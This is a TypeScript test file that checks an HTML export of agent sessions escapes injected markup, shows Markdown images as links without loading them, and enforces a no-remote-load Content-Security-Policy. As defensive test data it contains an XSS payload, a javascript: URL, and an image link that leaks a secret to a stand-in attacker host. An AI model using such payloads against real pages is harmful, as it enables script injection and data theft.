import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createContext, runInContext } from "node:vm";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { exportFromFile } from "../src/core/export-html/index.ts";
import { CURRENT_SESSION_VERSION, type SessionHeader } from "../src/core/session-manager.ts";
import { initTheme } from "../src/modes/interactive/theme/theme.ts";

interface Viewer {
	renderEntry(entry: unknown): string;
	getTreeNodeDisplayHtml(entry: unknown, label?: string): string;
	safeMarkedParse(text: string): string;
}

// Runs the exported page's own scripts (marked, highlight.js and the viewer) up to where it starts drawing.
function loadViewer(html: string): Viewer {
	const sessionData = html.match(/<script id="session-data" type="application\/json">([^<]+)<\/script>/)?.[1];
	const scripts = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map((match) => match[1]);
	const viewer = scripts.pop();
	if (!sessionData || !viewer) throw new Error("Missing exported session data or viewer script");
	const context = createContext({
		atob,
		TextDecoder,
		URLSearchParams,
		document: { getElementById: () => ({ textContent: sessionData }), querySelector: () => null },
		window: { location: { search: "" } },
	});
	for (const script of scripts) runInContext(script, context);
	return runInContext(
		viewer.replace(
			"function safeMarkedParse(",
			"return { renderEntry, getTreeNodeDisplayHtml, safeMarkedParse }; function safeMarkedParse(",
		),
		context,
	);
}

const MARKUP = `<img src=x onerror="document.body.dataset.xss=1">`;

describe("HTML export of a session file", () => {
	let tempDir: string;
	let html: string;
	let viewer: Viewer;

	beforeAll(async () => {
		initTheme("dark");
		tempDir = mkdtempSync(join(tmpdir(), "pi-export-fields-"));
		const header = {
			type: "session",
			version: CURRENT_SESSION_VERSION,
			id: "fields-test",
			timestamp: new Date(0).toISOString(),
			cwd: tempDir,
		} satisfies SessionHeader;
		const sessionPath = join(tempDir, "session.jsonl");
		writeFileSync(sessionPath, `${JSON.stringify(header)}\n`);
		html = readFileSync(await exportFromFile(sessionPath, join(tempDir, "out.html")), "utf8");
		viewer = loadViewer(html);
	});

	afterAll(() => {
		rmSync(tempDir, { recursive: true, force: true });
	});

	// Pi writes numbers in these fields; a hand-made session file can put markup there.
	it("escapes a shell command's exit code and a compaction's token count", () => {
		const timestamp = new Date(0).toISOString();
		const bash = viewer.renderEntry({
			type: "message",
			id: "bash",
			parentId: null,
			timestamp,
			message: {
				role: "bashExecution",
				command: "true",
				output: "",
				exitCode: MARKUP,
				cancelled: false,
				timestamp: 0,
			},
		});
		expect(bash).not.toContain("<img");
		expect(bash).toContain("(exit &lt;img");

		const compaction = { type: "compaction", id: "c", parentId: null, timestamp, summary: "s", tokensBefore: MARKUP };
		for (const rendered of [viewer.renderEntry(compaction), viewer.getTreeNodeDisplayHtml(compaction)]) {
			expect(rendered).not.toContain("<img");
		}

		const counted = viewer.renderEntry({ ...compaction, tokensBefore: 123456 });
		expect(counted).toContain(`Compacted from ${(123456).toLocaleString()} tokens`);
	});

	it("shows a Markdown image as a link to it, without loading it", () => {
		const rendered = viewer.safeMarkedParse("![chart](https://attacker.example/leak?secret=SECRET)");
		expect(rendered).not.toContain("<img");
		expect(rendered).toContain('<a href="https://attacker.example/leak?secret=SECRET"');
		expect(rendered).toContain(">chart</a>");

		const relative = viewer.safeMarkedParse('![shot](images/a.png "A title")');
		expect(relative).not.toContain("<img");
		expect(relative).toContain('<a href="images/a.png"');

		const script = viewer.safeMarkedParse("![x](javascript:alert(1))");
		expect(script).not.toContain("<a");
		expect(script).not.toContain("<img");
	});

	it("allows the page no remote loads", () => {
		const policy = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/)?.[1];
		expect(policy).toBeDefined();
		const directives = new Map(
			policy!.split(";").map((directive) => {
				const [name, ...values] = directive.trim().split(/\s+/);
				return [name!, values] as const;
			}),
		);
		expect(directives.get("default-src")).toEqual(["'none'"]);
		expect(directives.get("img-src")).toEqual(["data:", "blob:"]);
		for (const name of ["script-src", "style-src", "img-src"]) {
			expect(
				directives.get(name)!.some((value) => /^https?:|^\*$/.test(value)),
				name,
			).toBe(false);
		}
		// Before anything that loads.
		expect(html.indexOf("Content-Security-Policy")).toBeLessThan(html.indexOf("<style>"));
	});
});
